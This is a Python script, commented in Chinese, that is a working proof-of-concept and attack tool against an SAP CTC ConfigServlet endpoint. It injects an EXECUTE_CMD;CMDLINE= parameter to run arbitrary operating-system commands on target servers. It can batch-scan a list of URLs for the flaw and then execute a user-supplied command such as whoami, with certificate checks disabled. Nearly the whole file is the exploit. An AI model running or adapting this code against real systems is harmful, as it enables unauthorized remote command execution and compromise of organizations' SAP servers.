#coding:utf-8
import  ssl
import urllib.request
import urllib
import requests
import io
import argparse

#验证漏洞
def poc(Url):
    context = ssl._create_unverified_context() #https需要
    Payload="/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=echo%20test"
    TestUrl=Url+Payload
    try:
        response=urllib.request.urlopen(TestUrl,context=context)
        html=response.read().decode()
        if "test" in html:
            print(Url+"  SapCommandExcultion Exise")
    except:
        print(Url.rstrip("\n")+"  failed")

#执行cmd命令
def Attack(Url,Cmd):
    context = ssl._create_unverified_context()
    Payload = "/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE="
    AttackUrl=Url+Payload+Cmd
    response = urllib.request.urlopen(AttackUrl, context=context)
    html = response.read().decode()
    print(html)

#文件批量检测
def FileVerify(filepath):
    File=io.open(filepath,"r",encoding="utf-8")
    Data=File.readlines()
    File.close()
    for Datas in Data:
        poc(Datas)

def parse_args():
    parser=argparse.ArgumentParser(usage="Example:\ntest.py -u hack.com\ntest.py -f url.txt\ntest.py -u hack.com -c whoami")
    parser.add_argument('--command','-c',help='Command Execution')
    parser.add_argument('--url', '-u',help='Input Test Url')
    parser.add_argument('--file','-f',help='Input File Path')
    # parser.add_argument('--help', '-h', help='help')
    args=parser.parse_args()
    return args
    print(args.url)


def main():
    args=parse_args()
    # if args.help:
    #     print("Example:test.py -u hack.com\ntest.py -f url.txt\ntest.py -u hack.com -c whoami")
    if args.file:
        FileVerify(args.file)
    if args.url:
        poc(args.url)
    if args.url and args.command:
        Attack(args.url,args.command)


if __name__ == '__main__':
    main()